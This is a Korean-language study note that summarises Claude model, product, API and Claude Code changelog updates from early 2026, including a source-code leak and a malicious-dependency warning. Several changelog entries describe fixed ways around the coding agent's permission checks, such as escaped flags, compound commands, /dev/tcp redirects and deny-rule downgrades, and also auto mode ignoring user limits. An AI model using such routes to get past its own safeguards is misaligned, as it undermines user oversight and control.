---
date: 2026-04-06
tags:
  - tech
  - ai
  - claude
  - updates
  - 2026
status: learning
type: tech-series
---

# Claude 2026 주요 업데이트 총정리

## 타임라인

```mermaid
timeline
    title Claude 2026 주요 릴리스
    2026-01 : Cowork 리서치 프리뷰
           : "Vibe Working" 컨셉 발표
    2026-02-05 : Opus 4.6 출시
              : 1M 토큰 컨텍스트
    2026-02-17 : Sonnet 4.6 출시
              : Computer Use 72.5%
    2026-02-20 : Claude Code Security
              : 500+ 취약점 발견
    2026-02-24 : Cowork Enterprise
              : Deep Connectors
    2026-03-17 : Dispatch 출시
              : 모바일→데스크톱 원격 제어
    2026-03-20 : Claude Code Channels
              : Telegram/Discord/iMessage
    2026-03-24 : Computer Use 정식
              : 데스크톱 자동 조작
    2026-03-27 : Claude Code v2.1.86
              : Channels 플래그, 세션 ID 헤더
    2026-03-29 : Claude Code v2.1.87
              : Dispatch 메시지 전달 버그 수정
    2026-03-31 : Claude Code v2.1.88
              : npm 소스맵 파일 실수로 포함
              : 소스코드 51만 줄 유출
    2026-04-01 : Claude Code v2.1.89
              : defer 훅 권한, PermissionDenied 훅
              : 호주 정부 MOU 체결
    2026-04-01 : Claude Code v2.1.90
              : /powerup 인터랙티브 레슨
              : 성능 개선, 프라이버시 강화
    2026-04-03 : Claude Code v2.1.91
              : MCP 결과 영속성 제어
              : Plugin bin/ 디렉토리 지원
    2026-04-04 : Claude Code v2.1.92
              : forceRemoteSettingsRefresh 정책
              : Bedrock 대화형 설정 마법사
              : OpenClaw 구독 종료
    2026-04-05 : 미국 정부, Anthropic 블랙리스트
              : 국가안보 공급망 위험 지정
              : 법원 가처분 집행 이후 재발효
    2026-04-06 : Claude.ai 서비스 장애
              : CVE-2026-33068 보안 취약점 공개
              : deny 규칙 우회 버그 (v2.1.90에서 수정)
    2026-04-07 : Claude Code v2.1.94
              : Amazon Bedrock Mantle 지원, 기본 effort=high
              : Project Glasswing (Claude Mythos 사이버보안 프리뷰)
    2026-04-08 : Claude Code v2.1.96
              : Bedrock 403 인증 오류 핫픽스
    2026-04-08 : Claude Code v2.1.97
              : Focus view 토글, Cedar 문법 강조, 보안 강화
    2026-04-08 : Claude Managed Agents 공개 베타
              : 완전 관리형 에이전트 하네스, 샌드박스, SSE
    2026-04-08 : ant CLI 출시
              : Claude API 전용 커맨드라인 클라이언트
    2026-04-09 : Claude Code v2.1.98
              : Vertex AI 설정 마법사, Monitor 툴, Perforce 모드
              : Bash 권한 보안 다수 수정
    2026-04-09 : Advisor Tool API 공개 베타
              : 실행 모델 + 고지능 어드바이저 모델 병행 사용
    2026-04-10 : Claude Code v2.1.101
              : /team-onboarding 명령어, OS CA 인증서 신뢰
              : 커맨드 인젝션 취약점 수정, 메모리 누수 수정
```

---

## 1. 모델 업데이트

### Claude Opus 4.6 (2026-02-05)

| 항목 | 내용 |
|------|------|
| 컨텍스트 윈도우 | **1M 토큰** (100만) |
| 주요 개선 | 코딩, 계획, 디버깅 능력 강화 |
| 특징 | Finance Agent 벤치마크 1위, 14.5시간 연속 작업 가능 |
| 멀티에이전트 | "팀" 협업 기능 |
| 가용성 | claude.ai, API, AWS, GCP |

### Claude Sonnet 4.6 (2026-02-17)

| 항목 | 내용 |
|------|------|
| 가격 | Sonnet 4.5와 동일 |
| Computer Use | OSWorld 벤치마크 ~15% → **72.5%** |
| 주요 개선 | 코딩, 에이전트 검색, 장문 추론 |
| 컨텍스트 | 1M 토큰 (베타) |

### Claude Mythos (예정)

- Opus보다 상위 티어의 새 모델
- 고급 추론 기능 탑재 예정
- 별도 가격 책정

---

## 2. 제품 기능

### Cowork (2026-01)

- 코딩을 넘어 **모든 지식 근로자**를 위한 AI 작업 도구
- "Vibe Working": 목표를 말하면 거의 완성된 결과물 제공
- → 자세한 내용: [[11-cowork-dispatch]]

### Dispatch (2026-03-17)

- 모바일에서 작업 지시 → 데스크톱에서 실행
- **Persistent Thread**: 세션 리셋 없이 연속 작업
- Computer Use와 결합하여 데스크톱 자동 조작
- Pro/Max 플랜에서 사용 가능
- → 자세한 내용: [[11-cowork-dispatch]]

### Claude Code Channels (2026-03-20)

- Telegram, Discord, iMessage로 Claude Code 원격 제어
- MCP 서버 기반 양방향 통신
- 리서치 프리뷰 (v2.1.80+)
- → 자세한 내용: [[10-channels]]

### Computer Use (2026-03-24 정식)

- Claude가 데스크톱 화면을 보고 직접 조작
- 앱 열기, 웹 브라우저 탐색, 스프레드시트 편집
- Dispatch와 결합하여 부재중에도 작업 수행

### Claude Code v2.1.88 (2026-03-31) ⚠️ 소스코드 유출 사고

> ⚠️ **보안 경고**: 2026-03-31 00:21~03:29 UTC 사이에 npm에서 Claude Code를 설치한 경우, axios 1.14.1 또는 0.30.4 악성 버전(RAT 포함)이 설치되었을 수 있음. `plain-crypto-js` 의존성이 lockfile에 있으면 즉시 시크릿 교체 및 OS 재설치 권고.

**소스코드 유출 사고**

Anthropic이 npm 패키지에 59.8MB JavaScript 소스맵 파일(`.map`)을 실수로 포함시켜 **약 51만 줄(~1,900개 파일)의 TypeScript 소스코드**가 공개됨.

- 2026-03-31 04:23 ET, 보안 연구자 Chaofan Shou(@shoucccc)가 X에 최초 공개
- GitHub 백업 repo가 **41,500+ 포크**로 확산
- Anthropic 공식 입장: "고객 데이터·자격증명 노출 없음. 인간 실수로 인한 릴리스 패키징 오류"

**유출로 드러난 내부 정보**

| 코드명 | 실제 모델 |
|--------|-----------|
| Fennec | Opus 4.6 |
| Capybara | Claude 4.6 변종 (미출시) |
| Numbat | 테스트 중인 미공개 모델 |

- 44개의 기능 플래그(빌드는 완료됐지만 미출시 기능들)
- **Undercover Mode**: 내부 코드명이 외부에 노출되는 것을 막는 시스템 (아이러니하게 소스맵으로 전체 유출됨)
- **KAIROS**: "Always-On Claude" 영속 어시스턴트 모드 (세션 간 메모리 유지, 선제적 작업 시작)

**신규 기능**

- `CLAUDE_CODE_NO_FLICKER=1` 환경변수: 깜박임 없는 alt-screen 렌더링 (가상 스크롤백)
- `@` 멘션에서 이름 있는 서브에이전트 지원
- `PermissionDenied` 훅: auto mode classifier 거부 후 발동
- PowerShell 지원 확대, 권한 처리 개선
- 장세션 안정성, Windows/음성 모드 버그 수정

> 출처:
> - https://www.theregister.com/2026/03/31/anthropic_claude_code_source_code/
> - https://siliconangle.com/2026/03/31/anthropic-accidentally-exposes-claude-code-source-code-npm-packaging-error/
> - https://fortune.com/2026/03/31/anthropic-source-code-claude-code-data-leak-second-security-lapse-days-after-accidentally-revealing-mythos/

---

### Claude Code 사용량 한도 초과 이슈 (2026-03-31)

- 사용자들이 예상보다 훨씬 빠르게 Claude Code 쿼터를 소진하는 문제 발생
- Anthropic 공식 인정: "사람들이 예상보다 훨씬 빠르게 사용 한도에 도달하고 있다. 팀의 최우선 과제로 조사 중"
- 배경: 3월 28일 프로모션 종료(피크 타임 외 2배 한도), 피크 타임 쿼터 감소(사용자 7% 영향), 토큰 사용 증가 버그 가능성

> 출처: https://www.theregister.com/2026/03/31/anthropic_claude_code_limits/

---

### Claude Code v2.1.91 (2026-04-03)

**신규 기능**

- **MCP 툴 결과 영속성 제어**: `_meta["anthropic/maxResultSizeChars"]` 어노테이션으로 툴 결과 최대 크기 재정의 (최대 500,000자). 대규모 DB 스키마·API 응답이 잘려나가던 문제 해결
- **`disableSkillShellExecution` 설정**: Skill, 커스텀 슬래시 커맨드, 플러그인 커맨드 내 인라인 쉘 실행을 세밀하게 제어하는 보안 설정 추가
- **Plugin `bin/` 디렉토리 지원**: 플러그인이 실행 파일을 패키지에 포함하고 Bash 툴 내에서 직접 호출 가능. 플러그인 생태계 확장

**주요 버그 수정**

- `--resume` 시 프롬프트 캐시 미스 수정
- `Edit`/`Write` 파일 변경 처리 이슈 수정
- `PreToolUse` 훅이 툴 콜을 올바르게 차단하지 않던 문제 수정
- auto mode가 명시적 사용자 경계를 무시하던 문제 수정
- 프로젝트 루트 밖 파일 접근 실패 수정
- config 디스크 쓰기로 인한 Windows 파일 손상 수정
- 멀티라인 deep link 지원 추가

> 출처: https://claude-world.com/articles/claude-code-2191-release/

---

### Claude Code v2.1.101 (2026-04-10)

> 출처: https://code.claude.com/docs/en/changelog

**신규 기능**

- **`/team-onboarding` 명령어**: 로컬 Claude Code 사용 기록을 기반으로 팀원 온보딩 가이드 자동 생성
- **OS CA 인증서 저장소 신뢰**: 엔터프라이즈 TLS 프록시가 추가 설정 없이 기본 동작 (번들 CA만 사용하려면 `CLAUDE_CODE_CERT_STORE=bundled` 설정)
- **클라우드 환경 자동 생성**: `/ultraplan` 및 원격 세션 기능이 웹 설정 없이 기본 클라우드 환경을 자동 생성

**개선 사항**

- **Brief mode 재시도 로직**: Claude가 구조화된 메시지 대신 일반 텍스트로 응답할 때 한 번 재시도
- **Focus mode 요약**: Claude가 마지막 메시지만 볼 수 있음을 인식하여 더 자체 완결적인 요약 작성
- **향상된 오류 메시지**: 툴 사용 불가 오류에 원인과 대응 방법 안내 포함
- **Rate-limit 피드백**: 불명확한 카운트다운 대신 어떤 한도에 걸렸는지와 리셋 시각 표시
- **거부 설명**: API 제공 설명이 있을 때 거부 이유 포함
- **세션 재개**: `/resume`이 `/rename` 또는 `--name`으로 설정한 세션 제목 검색 지원
- **설정 복원력**: 인식되지 않는 훅 이벤트 이름이 전체 `settings.json`을 무시하지 않음
- **Plugin 훅**: `allowManagedHooksOnly` 설정 시 강제 활성화된 플러그인 훅 실행
- **Plugin 경고**: 마켓플레이스 갱신 실패 시 오래된 버전 표시 대신 경고 메시지 표시
- **SDK 정리**: `for await`에서 `break`하거나 `await using` 사용 시 `query()`가 서브프로세스와 임시 파일 정리
- **OTEL 트레이싱**: `OTEL_LOG_USER_PROMPTS`, `OTEL_LOG_TOOL_DETAILS`, `OTEL_LOG_TOOL_CONTENT` 환경변수 적용

**보안 & 버그 수정**

- **커맨드 인젝션 수정**: LSP 바이너리 감지의 POSIX `which` 폴백에서 발생하던 취약점 수정
- **메모리 누수 수정**: 장시간 세션에서 과거 메시지 복사본 유지하지 않음; Bedrock 인증 실패 수정; 기타 메모리 누수 수정
- **Resume 안정성**: 대용량 세션에서 대화 컨텍스트 손실 수정; 체인 복구 브리징 문제 수정
- **타임아웃 처리**: 느린 백엔드를 중단시키던 하드코딩된 5분 타임아웃 수정
- **권한 규칙**: `permissions.deny` 규칙이 `PreToolUse` 훅을 재정의하지 않던 문제 수정
- **Bedrock 인증**: 커스텀 헤더로 SigV4 인증 실패하던 문제 수정
- **Worktree 관리**: 정리 후 "already exists" 오류 수정
- **MCP 툴 상속**: 서브에이전트가 동적 서버의 MCP 툴을 상속받지 못하던 문제 수정
- **샌드박스 접근**: 격리된 worktree의 서브에이전트가 자체 worktree Read/Edit 접근 거부되던 문제 수정
- **Bash 샌드박싱**: `mktemp: No such file or directory`로 명령 실패하던 문제 수정
- **MCP 툴 유효성 검사**: `outputSchema`를 검증하는 클라이언트에서 툴 콜이 실패하던 문제 수정
- **Resume 피커 수정**: 좁은 기본 뷰, 접근 불가 미리보기, cwd 문제, 힌트 겹침 등 다수 UI 개선

---

### Claude Code v2.1.98 (2026-04-09)

**신규 기능**

- **Google Vertex AI 설정 마법사**: 로그인 화면에서 "3rd-party platform" 선택 시 접근 가능한 대화형 GCP 인증/프로젝트/리전 설정 가이드
- **`CLAUDE_CODE_PERFORCE_MODE` 환경변수**: 읽기 전용 파일에 Edit/Write/NotebookEdit 시 자동 덮어쓰기 대신 `p4 edit` 힌트와 함께 오류 발생
- **Monitor 툴**: 백그라운드 스크립트에서 이벤트를 스트리밍하는 새로운 툴 추가
- **Linux 서브프로세스 샌드박싱**: `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` 설정 시 PID 네임스페이스 격리, `CLAUDE_CODE_SCRIPT_CAPS` 환경변수로 세션당 스크립트 실행 횟수 제한
- **`--exclude-dynamic-system-prompt-sections` 플래그**: print 모드에서 크로스 유저 프롬프트 캐싱 개선
- **`workspace.git_worktree`**: statusline JSON 입력에 git worktree 감지 필드 추가
- **W3C `TRACEPARENT`**: OTEL 트레이싱 활성화 시 Bash 툴 서브프로세스에 전달, 차일드 프로세스 스팬이 Claude Code 트레이스 트리에 올바르게 연결
- **LSP `clientInfo`**: Claude Code가 언어 서버에 `initialize` 요청 시 자신을 `clientInfo`로 식별

**보안 수정**

- Bash 툴 백슬래시 이스케이프 플래그로 read-only 자동 허용 → 임의 코드 실행 가능하던 권한 우회 수정
- 복합 Bash 명령어가 강제 권한 프롬프트를 우회하던 문제 수정
- env var 접두사가 있는 read-only 명령이 안전 변수(`LANG`, `TZ`, `NO_COLOR`)가 아닌 경우 프롬프트 표시
- `/dev/tcp/...` 또는 `/dev/udp/...`로의 리다이렉트 자동 허용 → 프롬프트로 전환
- `Bash(cmd:*)`, `Bash(git commit *)` 와일드카드 규칙이 공백/탭 포함 명령과 매칭 실패하던 문제 수정
- `Bash(...)` deny 규칙이 `cd`와 파이프 결합 시 프롬프트로 다운그레이드되던 문제 수정
- JavaScript 프로토타입 속성과 이름이 겹치는 permission rule로 `settings.json`이 무시되던 문제 수정

**버그 수정**

- 스트리밍 응답 중단 시 비스트리밍 모드 폴백 대신 타임아웃 수정
- 429 retry가 소형 `Retry-After`로 인해 ~13초 안에 모든 시도를 소진하던 문제 → 지수 백오프 최솟값 적용
- macOS 텍스트 치환이 트리거 단어를 치환 텍스트 대신 삭제하던 문제 수정
- `--dangerously-skip-permissions`가 보호 경로 쓰기 승인 후 accept-edits 모드로 조용히 다운그레이드되던 문제 수정
- 에이전트 팀원이 리더의 permission 모드를 상속하지 않던 문제 수정 (--dangerously-skip-permissions)
- fullscreen 모드에서 MCP 툴 결과 hover 시 크래시 수정
- fullscreen 모드에서 줄바꿈 URL 복사 시 공백 삽입 수정
- `/resume` 시 10KB 초과 파일의 편집 diff 사라지는 문제 수정
- `/export`가 절대 경로·`~` 미적용 및 확장자 자동 `.txt` 변환하던 문제 수정
- `DISABLE_COMPACT` 시 `/compact` 힌트 표시 제거
- `CLAUDE_CODE_MAX_CONTEXT_TOKENS`가 `DISABLE_COMPACT` 미적용 수정

**UX 개선**

- `/resume` 피커에 프로젝트/워크트리/브랜치 이름 표시
- `/agents` 탭 레이아웃 개선: Running 탭(라이브 서브에이전트), Library 탭(Run agent/View running instance 추가)
- `/reload-plugins`로 재시작 없이 플러그인 제공 스킬 반영
- Accept Edits 모드에서 안전 env var 또는 프로세스 래퍼 접두사 명령 자동 승인
- Vim 모드에서 `j`/`k`가 NORMAL 모드에서 히스토리 탐색 및 footer pill 선택
- 훅 오류에 stderr 첫 줄 포함 (--debug 없이 자가 진단 가능)

> 출처: https://code.claude.com/docs/en/changelog

---

### Claude API: Advisor Tool 공개 베타 (2026-04-09)

> 출처: https://platform.claude.com/docs/en/release-notes/overview

- **Advisor Tool** 공개 베타 출시
- 빠른 **executor 모델**과 고지능 **advisor 모델**을 병행 사용
- Advisor 모델이 생성 중간에 전략적 가이던스를 제공 → 어드바이저 단독 수준의 품질을 executor 모델 속도로 달성
- 장기 에이전트 작업에 적합
- 베타 헤더: `advisor-tool-2026-03-01`

```bash
# Advisor Tool 활성화 예시
curl https://api.anthropic.com/v1/messages \
  -H "anthropic-beta: advisor-tool-2026-03-01" \
  -d '{"model": "claude-haiku-4-5-20251001", ...}'
```

---

### Claude Managed Agents 공개 베타 (2026-04-08)

> 출처: https://platform.claude.com/docs/en/release-notes/overview

- **완전 관리형 에이전트 하네스** 공개 베타 출시
- Claude를 자율 에이전트로 실행: 안전한 샌드박싱, 기본 탑재 툴, SSE 스트리밍
- API를 통해 에이전트 생성·컨테이너 설정·세션 실행 가능
- 베타 헤더: `managed-agents-2026-04-01`
- 자세한 내용: [Claude Managed Agents 개요](https://platform.claude.com/docs/en/managed-agents/overview)

---

### ant CLI 출시 (2026-04-08)

> 출처: https://platform.claude.com/docs/en/release-notes/overview

- **`ant` CLI**: Claude API 전용 커맨드라인 클라이언트
- Claude API와의 빠른 인터랙션 지원
- Claude Code와 네이티브 통합
- API 리소스를 **YAML 파일**로 버전 관리 가능
- 자세한 내용: [CLI 레퍼런스](https://platform.claude.com/docs/en/api/sdks/cli)

---

### Claude Code v2.1.97 (2026-04-08)

**신규 기능**

- **Focus view 토글 (`Ctrl+O`)**: `NO_FLICKER` 모드에서 프롬프트, 한 줄 툴 요약(edit diffstat 포함), 최종 응답만 표시하는 집중 뷰 전환
- **`refreshInterval` statusline 설정**: N초마다 statusline 명령어 자동 재실행
- **`workspace.git_worktree`**: statusline JSON 입력에 연결된 git worktree 감지용 필드 추가
- **`● N running` 표시기**: `/agents`에서 라이브 서브에이전트 인스턴스 수 실시간 표시
- **Cedar 정책 파일 문법 강조**: `.cedar`, `.cedarpolicy` 확장자 지원

**보안 강화**

- Bash 툴 권한 강화 (하드닝)
- JavaScript 프로토타입 속성 매칭하는 permission rule 버그 수정
- MCP 연결 버퍼 관리 강화

**버그 수정**

- 429 rate-limit retry 시 지수 백오프 최소값 수정
- `/resume` 피커 이슈 및 파일 편집 diff 사라지는 문제 수정
- 긴 세션에서 `Stop`/`SubagentStop` 훅 실패 수정
- 서브에이전트 작업 디렉토리가 부모 세션에 누출되는 문제 수정
- `claude plugin update`에서 "already at latest version" 오탐 수정
- NO_FLICKER 모드 렌더링 버그 다수 수정 (스크롤 아티팩트, 메모리 누수, Windows Terminal 성능)
- 안전한 env var 및 프로세스 래퍼에 대한 auto-approve 개선 (예: `LANG=C rm foo`)
- 이미지 처리 일관성 개선 (토큰 예산 압축)
- CJK 슬래시 커맨드/멘션 트리거링 개선
- `/claude-api` 스킬 문서 업데이트

> 출처: https://code.claude.com/docs/en/changelog

---

### Claude Code v2.1.96 (2026-04-08)

**버그 수정**

- `AWS_BEARER_TOKEN_BEDROCK` 또는 `CLAUDE_CODE_SKIP_BEDROCK_AUTH` 사용 시 Bedrock 요청이 `403 "Authorization header is missing"` 오류로 실패하는 문제 수정 (v2.1.94에서 발생한 회귀)

> 출처: https://code.claude.com/docs/en/changelog

---

### Claude Code v2.1.94 (2026-04-07)

**신규 기능**

- **Amazon Bedrock Mantle 지원**: `CLAUDE_CODE_USE_MANTLE=1` 환경변수로 Amazon Bedrock powered by Mantle 사용 가능
- **기본 effort 레벨 변경**: API-key, Bedrock/Vertex/Foundry, Team, Enterprise 사용자의 기본 effort가 `medium` → `high`로 상향 (`/effort`로 조정 가능)
- **Slack MCP 헤더 개선**: `send-message` 툴 콜에 클릭 가능한 채널 링크가 포함된 간결한 `Slacked #channel` 헤더 추가
- **Plugin frontmatter 신규 필드**: `keep-coding-instructions` 지원
- **세션 제목 제어**: `UserPromptSubmit` 훅에 `hookSpecificOutput.sessionTitle` 추가
- **Plugin Skill 이름 변경**: `"skills": ["./"]`로 선언된 플러그인 스킬이 디렉토리 베이스명 대신 frontmatter `name` 필드로 호출됨

**주요 버그 수정**

- 429 rate-limit 응답에서 긴 `Retry-After` 헤더로 인해 에이전트가 멈춘 것처럼 보이는 문제 수정
- macOS 키체인 잠금 시 Console 로그인이 자동으로 실패하던 문제 수정
- 플러그인 스킬 훅, 훅 파일 디렉토리 처리, 마켓플레이스 플러그인 해석 관련 다수 수정
- 스크롤백, 멀티라인 프롬프트 들여쓰기, 검색 입력 Shift+Space, 렌더링 버그 수정
- xterm.js 기반 터미널 하이퍼링크 열기 및 alt-screen 렌더링 문제 수정
- `FORCE_HYPERLINK` 환경변수가 `settings.json`을 통해 무시되던 문제 수정
- 화면 낭독기에서 선택된 탭을 따라가지 못하던 네이티브 터미널 커서 접근성 수정
- VS Code cold-open 서브프로세스 작업 감소로 성능 향상

> 출처: https://code.claude.com/docs/en/changelog

---

### Claude Code v2.1.92 (2026-04-04)

**신규 기능**

- `forceRemoteSettingsRefresh` 정책 설정: 원격 관리 설정을 새로 받아올 때까지 CLI 시작 차단 (fail-closed 방식)
- 로그인 화면에서 접근 가능한 **대화형 Bedrock 설정 마법사**
- 구독 사용자 `/cost` 명령에 **모델별·캐시 히트별 세분화 내역** 추가
- `/release-notes` 명령이 **대화형 버전 선택기**로 개선
- Remote Control 세션 이름이 호스트명을 기본 접두사로 사용 (예: `myhost-graceful-unicorn`)
- Pro 사용자가 프롬프트 캐시 만료 후 세션 복귀 시 푸터 힌트 표시

**주요 버그 수정**

- tmux 창 종료 후 서브에이전트 생성이 "Could not determine pane count" 오류로 영구 실패하는 문제 수정
- 소형 fast 모델이 `ok:false`를 반환할 때 prompt-type Stop 훅이 잘못 실패하는 문제 수정
- 스트리밍에서 배열/객체 필드가 JSON 인코딩 문자열로 전송될 때 툴 입력 유효성 검사 실패 수정
- extended thinking이 공백만 있는 텍스트 블록을 생성할 때 API 400 오류 수정
- 오토파일럿 키 입력으로 피드백 설문이 의도치 않게 제출되는 문제 수정
- Write 툴 diff 계산 속도 **60% 향상** (탭/`&`/`$` 포함 파일)
- 다양한 터미널 에뮬레이터 지원 개선

**제거된 명령어**

- `/tag` 명령어 제거
- `/vim` 명령어 제거 → `/config` → Editor mode에서 토글 가능

> 출처: https://code.claude.com/docs/en/changelog

---

### OpenClaw 및 서드파티 에이전트 구독 종료 (2026-04-04)

- Anthropic이 **2026-04-04 12:00 PT**부로 Claude Pro/Max 구독을 OpenClaw 및 모든 서드파티 에이전트 도구에서 사용하는 것을 종료
- 해당 도구 사용자는 **종량제(pay-as-you-go)** 초과 사용 청구 또는 **직접 API 접근**으로 전환 필요
- 배경: 구독 플랜을 API 연동 도구에 우회 사용하는 것을 방지하기 위한 정책 변경

> 출처: https://venturebeat.com/technology/anthropic-cuts-off-the-ability-to-use-claude-subscriptions-with-openclaw-and

---

### Claude Code v2.1.90 (2026-04-01)

**신규 기능**

- `/powerup` 명령어: Claude Code 기능을 애니메이션 데모로 가르쳐주는 인터랙티브 레슨
- `CLAUDE_CODE_PLUGIN_KEEP_MARKETPLACE_ON_FAILURE` 환경변수: `git pull` 실패 시 기존 마켓플레이스 캐시 유지 (오프라인 환경 지원)
- `.husky` 디렉토리를 보호 목록에 추가 (acceptEdits 모드)

**주요 버그 수정**

- 사용량 한도 초과 후 rate-limit 옵션 대화상자가 반복 자동 열리던 무한 루프 수정
- deferred tools, MCP 서버, 또는 커스텀 에이전트 사용자에서 `--resume` 시 프롬프트 캐시 미스 수정 (v2.1.69 이후 회귀)
- `PostToolUse` format-on-save 훅이 파일을 재작성할 때 `Edit`/`Write`가 "File content has changed" 오류로 실패하던 문제 수정
- `PreToolUse` 훅이 JSON을 stdout에 출력하고 코드 2로 종료 시 툴 콜을 올바르게 차단하지 않던 문제 수정
- auto mode가 명시적 사용자 경계("push하지 마세요", "X 전에 Y를 기다리세요")를 무시하던 문제 수정
- 라이트 터미널 테마에서 hover 텍스트가 거의 안 보이던 문제 수정
- 잘못된 툴 입력이 권한 대화상자에 도달 시 UI 크래시 수정
- `/model`, `/config` 등 선택 화면 스크롤 시 헤더 사라지던 문제 수정

**성능 & 보안 개선**

- 매 턴마다 MCP 툴 스키마를 JSON.stringify 하던 작업 제거로 성능 향상
- SSE 전송이 대용량 프레임을 선형 시간으로 처리
- SDK 세션이 더 이상 이차적으로 느려지지 않음
- `/resume` 전체 프로젝트 뷰가 세션을 병렬로 로드하도록 개선
- `--resume` 피커에서 `-p` 또는 SDK 호출로 생성된 세션 더 이상 표시하지 않음
- PowerShell 툴 권한 검사 강화
- **프라이버시**: `Get-DnsClientCache` 및 `ipconfig /displaydns`를 auto-allow 목록에서 제거 (DNS 캐시 정보 보호)

> 출처: https://code.claude.com/docs/en/changelog

---

### Claude Code v2.1.89 (2026-04-01)

**신규 기능**

- `"defer"` 권한 결정: `PreToolUse` 훅에서 headless 세션이 툴 콜 지점에서 일시 중단 → `-p --resume`으로 재개하여 재평가 가능
- `CLAUDE_CODE_NO_FLICKER=1` 환경변수: 가상 스크롤백을 사용한 깜박임 없는 alt-screen 렌더링
- `PermissionDenied` 훅: auto mode classifier 거부 후 발동. `{retry: true}` 반환 시 재시도 허용
- `@` 멘션 typeahead에서 **이름 있는 서브에이전트** 제안 표시
- `MCP_CONNECTION_NONBLOCKING=true`: `-p` 모드에서 MCP 연결 대기 완전 생략
- Auto mode: 거부된 명령이 알림으로 표시되고 `/permissions` → Recent 탭에서 `r`로 재시도 가능
- `/buddy` 명령어 (4월 1일 이스터에그): 코딩 중 함께하는 작은 생명체 부화 기능

**주요 버그 수정**

- `Edit(//path/**)` 및 `Read(//path/**)` allow 규칙에서 resolve된 심링크 대상 확인 수정
- 음성 push-to-talk 활성화 문제 및 Windows WebSocket 오류 수정
- Windows에서 Edit/Write 툴이 CRLF를 이중으로 추가하고 Markdown 하드 줄바꿈을 제거하던 문제 수정
- `StructuredOutput` 스키마 캐시 버그 수정 (다중 스키마 시 ~50% 실패율)
- 장시간 세션에서 대용량 JSON 입력으로 인한 메모리 누수 수정
- 50MB 이상 세션 파일에서 메시지 삭제 시 크래시 수정
- LSP 서버 크래시 후 좀비 상태 수정
- 4KB 경계에서 CJK/이모지 포함 프롬프트 히스토리 누락 수정
- `/stats`에서 토큰 수 미달 집계 및 30일 초과 데이터 손실 수정
- `-p --resume`에서 지연된 툴 입력 >64KB 시 hang 수정

**UX 개선**

- 축약된 툴 요약에서 `ls`/`tree`/`du` 결과를 "Listed N directories"로 표시
- PowerShell 버전별 적절한 문법 안내 개선
- Bash 툴이 포매터/린터가 이전에 읽은 파일을 수정할 때 경고 표시

> 출처: https://code.claude.com/docs/en/changelog

---

### Claude Code v2.1.87 (2026-03-29)

**버그 수정**
- Cowork Dispatch에서 메시지가 전달되지 않던 문제 수정

> 출처: https://github.com/anthropics/claude-code/releases/tag/v2.1.87

---

### Claude Code v2.1.86 (2026-03-27)

**세션 & 프록시**
- API 요청에 `X-Claude-Code-Session-Id` 헤더 추가 (프록시 집계 지원)
- MCP 서버 중복 제거: 로컬 설정과 claude.ai 커넥터 동시 설정 시 로컬 우선

**VCS 지원 확대**
- `.jj` (Jujutsu), `.sl` (Sapling) 디렉토리 제외 목록 추가

**버그 수정**
- `--resume` 시 "tool_use ids without tool_result blocks" 오류 수정
- 프로젝트 루트 밖 파일에서 Write/Edit/Read 도구 실패 수정
- `deniedMcpServers` 설정이 claude.ai MCP 서버를 차단하지 못하던 문제 수정
- `--bare` 모드에서 MCP 도구가 누락되던 문제 수정
- `/feedback` 사용 시 긴 세션에서 OOM 크래시 수정
- 마스킹된 입력(OAuth 코드)에서 토큰 시작 부분이 노출되던 문제 수정
- macOS/Linux에서 v2.1.83 이후 공식 마켓플레이스 플러그인 스크립트 실패 수정
- 리모트 세션 스트리밍 중단 시 메모리 누수 수정
- 엣지 연결 변경 시 ECONNRESET 오류 반복 수정

**성능 & UX 개선**
- macOS 키체인 캐시 스타트업 지연 단축 (5초 → 30초 간격)
- `@` 파일 멘션의 토큰 오버헤드 감소
- Bedrock/Vertex/Foundry 프롬프트 캐시 히트율 향상
- 1M 이상 토큰 수 표시 방식 개선 (`1512.6k` → `1.5m`)
- ToolSearch 활성화 시 글로벌 시스템 프롬프트 캐싱 정상 동작
- 메모리 파일명 클릭 시 하이라이트 및 열기 지원
- Skill 설명 250자 상한 적용, `/skills` 메뉴 알파벳 정렬

**신규 기능**
- statusline 스크립트에 `rate_limits` 필드 추가 (claude.ai 사용량 표시)
- `source: 'settings'` 플러그인 마켓플레이스 소스 지원
- skill/슬래시 커맨드에 `effort` frontmatter 지원
- `--channels` 플래그 리서치 프리뷰: MCP 서버가 세션으로 메시지 push 가능

**VS Code**
- 긴 작업 중 확장 프로그램 무응답 수정
- OAuth 갱신 후 Max 플랜 사용자가 Sonnet으로 기본 설정되던 문제 수정

> 출처: https://code.claude.com/docs/en/changelog

---

### Claude Apps (모바일)

- iOS/Android에서 인터랙티브 앱 실행
- 차트, 다이어그램 등 시각화를 대화 내에서 직접 렌더링
- 라이브 시각화 공유 가능

---

## 3. API & 플랫폼

### ⚠️ 모델 Deprecation 공지

| 모델 | 서비스 종료일 | 대체 모델 |
|------|-------------|-----------|
| Claude Haiku 3 (claude-3-haiku-20240307) | **2026-04-19** | Claude Haiku 4.5 |
| Sonnet 4.5/Sonnet 4 1M 컨텍스트 베타 (`context-1m-2025-08-07` 헤더) | **2026-04-30** | Claude Sonnet 4.6 또는 Opus 4.6 (정식 1M 지원) |

> 출처: https://releasebot.io/updates/anthropic

---

### Models API capability fields 추가 (2026-03-24)

- `GET /v1/models` 및 `GET /v1/models/{model_id}` 응답에 신규 필드 추가
  - `max_input_tokens`: 모델의 최대 입력 토큰 수
  - `max_tokens`: 모델의 최대 출력 토큰 수
  - `capabilities`: 모델 기능 목록 객체

```bash
# 모델 능력 조회 예시
curl https://api.anthropic.com/v1/models/claude-opus-4-6 \
  -H "x-api-key: $ANTHROPIC_API_KEY" \
  -H "anthropic-version: 2023-06-01"
# 응답에 max_input_tokens, max_tokens, capabilities 포함
```

> 출처: https://docs.anthropic.com/en/docs/changelog

---

### Message Batches API max_tokens 300k (2026-03-24)

- Message Batches API에서 Claude Opus 4.6 및 Sonnet 4.6의 `max_tokens` 상한이 **300,000 토큰**으로 상향
- 장문 콘텐츠, 대규모 구조화 데이터, 대용량 코드 작업에 활용 가능
- `output-300k-2026-03-24` 베타 헤더로 단일 턴 출력도 300k까지 확장 가능

```bash
# 300k 출력 활성화 예시
curl https://api.anthropic.com/v1/messages \
  -H "anthropic-beta: output-300k-2026-03-24" \
  -d '{"model": "claude-opus-4-6", "max_tokens": 300000, ...}'
```

> 출처: https://docs.anthropic.com/en/docs/changelog

---

### 코드 실행 무료화

- Web Search 또는 Web Fetch와 함께 사용 시 **API 코드 실행 무료**
- 샌드박스 코드 실행으로 모델 능력 + 토큰 효율 향상

### Web Search & Web Fetch GA

